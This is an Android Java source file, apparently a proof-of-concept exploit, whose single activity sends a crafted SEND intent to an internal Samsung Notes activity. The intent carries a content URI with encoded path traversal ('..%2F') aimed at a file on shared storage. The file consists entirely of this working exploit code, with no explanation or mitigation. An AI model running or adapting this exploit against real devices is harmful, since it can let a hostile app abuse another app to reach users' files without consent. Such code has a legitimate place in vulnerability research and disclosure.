package poc.app;

import android.app.Activity;
import android.content.ClipData;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        ClipData clipData = ClipData.newRawUri("", Uri.parse("content://poc.provider/..%2F..%2F..%2F..%2F..%2Fsdcard%2Ftest.txt"));
        clipData.addItem(new ClipData.Item(Uri.parse("")));

        Intent i = new Intent("android.intent.action.SEND");
        i.setClassName("com.samsung.android.app.notes", "com.samsung.android.support.senl.nt.app.trigger.PdfOnlyOpenTriggerActivity");
        i.setClipData(clipData);
        startActivity(i);
    }
}